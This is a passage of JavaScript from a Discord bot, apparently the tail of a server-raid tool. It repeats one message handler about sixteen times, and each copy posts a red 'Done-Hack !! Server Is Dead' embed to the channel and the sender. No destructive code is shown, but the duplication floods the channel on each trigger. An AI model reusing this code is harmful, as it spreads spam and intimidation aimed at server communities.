   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});



client.login(process.env.BOT_TOKEN);
